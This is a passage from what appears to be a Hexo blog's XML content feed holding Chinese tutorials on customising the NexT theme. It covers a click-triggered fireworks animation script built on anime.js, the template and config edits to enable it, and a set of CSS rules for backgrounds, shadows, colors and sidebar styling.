class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>打开<code>themes/next/layout/_layout.swig</code>,在上面写下如下代码：</p>
<pre class="line-numbers language-html"><code class="language-html">{% if theme.fireworks %}
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fireworks<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span> 
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//cdn.bootcss.com/animejs/2.2.0/anime.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> 
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/src/fireworks.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
{% endif %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>打开主题配置文件，在里面最后写下：</p>
<pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># Fireworks</span>
<span class="token key atrule">fireworks</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>hexo+github博客建立与美化</category>
      </categories>
      <tags>
        <tag>next主题</tag>
        <tag>next主题美化</tag>
        <tag>网站添加功能</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+NexT(v7.72)博客主题美化，打造“超炫”网站（三）---文章样式美化</title>
    <url>/nextthemebeautify3.html</url>
    <content><![CDATA[<h1 id="13-文章样式美化大全"><a href="#13-文章样式美化大全" class="headerlink" title="(13)文章样式美化大全"></a>(13)文章样式美化大全</h1><h5 id="大坑！！next新版-7-x-背景设置位置有变化，custom-styl没有！"><a href="#大坑！！next新版-7-x-背景设置位置有变化，custom-styl没有！" class="headerlink" title="大坑！！next新版(7.x)背景设置位置有变化，custom.styl没有！"></a>大坑！！next新版(7.x)背景设置位置有变化，custom.styl没有！</h5><p>因此网上大部分教程都是无效的。<br>正确设置方法：<br>首先主题配置文件取消注释(去掉下方的#号)</p>
<pre><code>custom_file_path:
  #style: source/_data/styles.styl</code></pre><p>在路径<code>~/hexo_blog/source</code>创建_data文件夹并在里面创建styles.styl文件，并添加以下内容<br>实现背景图片颜色透明度等修改，让你的博客更具“自我”！<br>详情请点击：</p>
<span id="more"></span>

<pre><code>// 添加背景图片
body {
 background-image: url(/images/u=1217520976,1493455735&amp;fm=26&amp;gp=0.jpg);
  background-repeat: no-repeat; //不重复
  background-attachment: fixed; //不随页面滚动
  background-position: 50% 50%; //center居中 
  background-size: 100% 100%;  //cover为填充
}


// 主页文章添加阴影效果
.post {
  margin-top: 60px;
  margin-bottom: 60px;
  padding: 25px;
  -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);
  -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);
 }


// 标题栏背景
.site-meta {
    padding: 20px 0;
    color: #fff;
    background-image: url(/images/95033e2a5404c30e2ab560e72b157a0a.jpg);
    background-repeat: no-repeat;
    background-attachment: fixed;
    background-position: center;
    background-size: 100% 100%;
}  


// 修改主体透明度
.main-inner{
    background: #fff;
    opacity: 0.85;

}


// 修改菜单栏透明度，会引起本地搜索菜单bug
.header-inner {
//    opacity: 0.95;
      border-radius: 30px 30px 30px 30px; //菜单栏椭圆化
      box-shadow: rgba(0,0,0,0.1) 0px 15px 35px 0px, rgba(0,0,0,0.31) 6px 6px 10px 0px;
}



//主标题颜色
.brand{
    color: #390044
}

//副标题颜色
.site-subtitle {
    margin-top: 10px;
    font-size: 13px;
    color: #ffffff;
}


//目录背景色
.header-inner{  
  background: #bc0100;
  background: linear-gradient(0deg, #bc0100 20%, #9b1d22 80%);
}


//侧边栏与文字的颜色
.menu-item a{

  color: #fbda41 //左上目录文字颜色
}

.menu-item-active a{
  color: #555555
}

//页脚文字
.footer,.footer a,.footer .with-love{
  //color: #31ff00
}


//文章样式
//每一篇文章标题右侧增加图片
article .post-header{
  background: url(/images/46265dece9bce1c56eb6dc6d4c931423.jpeg);
  background-repeat: no-repeat;//不重复
  background-position: right ; //居右
  background-size: contain;//合适大小
  //color: #ff0000; //归档的日期文字颜色
}


//文章版权处右侧增加图片（没有找到图片所在位置）
article .post-copyright{
  background: url(https://s1.ax1x.com/2018/12/20/FrD60g.png);//瑾贺新年 透明
  background-repeat: no-repeat;//不重复
  background-position: right bottom ; //居右下
  background-size: contain;//auto按图片比例缩放
}


//文章内页左边栏样式
//左边栏概览
.sidebar-inner {
  //background: url(https://s1.ax1x.com/2018/12/20/FrBGIs.jpg);//元旦 大红背景
  background: url(/images/d487657bd263d8d9d17e23b75c241034.jpg);// 左下格式

  background-repeat: no-repeat;//不重复
  background-position: center ; //居右下
  background-size: cover;//auto按图片比例缩放

  //color: #fbda41;
  border-radius: 30px 30px 30px 30px;
  position: absolute;
  overflow: hidden;//上面三行效果：左下栏椭圆化
  box-shadow: rgba(0,0,0,0.1) 0px 15px 35px 0px, rgba(0,0,0,0.31) 6px 6px 10px 0px;
}

.sidebar-inner .site-overview-wrap .site-overview,.sidebar-inner .site-overview-wrap .site-overview .site-author-name,.sidebar a,.sidebar span.exturl,.site-state-item-name,.site-description{
  color: #fbda41;  //左下文字颜色
}

//文章内页左边栏(要改下方的颜色尽量全改，不然会颜色混杂)
.sidebar-nav .sidebar-nav-active{
  color: #fbda41;
  border-bottom-color: #fbda41;
}
.sidebar-nav li{
  color: #fbda41;
  border-bottom-color: #fbda41;
}
.links-of-blogroll-list{
  text-shadow: red 0 1px 0;//给links部分添加文字阴影
}
.post-toc ol a{
  color: #fbda41;
}


//二次深度美化
//给文章概述与文章标题添加上一个方框
.content .posts-expand .post-block{
    position: relative;
    margin-bottom: 30px;
    padding: 40px 20px;
    font-size: 14px;
    box-shadow: rgba(0,0,0,0.1) 0px 15px 35px 0px, rgba(0,0,0,0.31) 6px 6px 10px 0px;//添加阴影效果
    border-radius: 20px;//添加椭圆效果
    background-color: #FFF0F5;//文章的背景色
    transition: -webkit-transform .3s;
    transition: transform .3s;
    transition: transform .3s,-webkit-transform .3s;
    transform-style: preserve-3d;
}
.post-expand .post-body{
    position: relative;
    overflow: visible;
    padding: 20px;
    color: #666;
    font-size: 15px;
    word-break: break-word;
}


//标签的美化，使用圆形方框美化
.tag-cloud a {
  box-shadow: 0 1px 3px #6f42c1, 0 1px 2px #d9534f;
  padding: 2px 10px;
  margin: 8px;
  background: #c1425c00;
  border-bottom: none;
  border-radius: 20px;
}


//顶部进度条的隐藏代码(亲测未找到效果)
.headband{
  height: 0px;
  background: #fc6423;

}


//修改不蒜子数据颜色
.busuanzi-value {
  color: #1890ff;
}</code></pre><p>颜色为十六进制形式，<a href="https://www.sioe.cn/yingyong/yanse-rgb-16/">在线颜色hex转化对照</a><br>可以自己寻找适合的颜色<br><a href="https://xian6ge.cn/posts/40ba2cba/">参考大佬文章</a><br>效果都可在本网站显示，建议亲自修改后体会不同。</p>
]]></content>
      <categories>
        <category>hexo+github博客建立与美化</category>
      </categories>
      <tags>
        <tag>next主题</tag>
        <tag>next主题美化</tag>
        <tag>网站添加功能</tag>
      </tags>
  </entry>
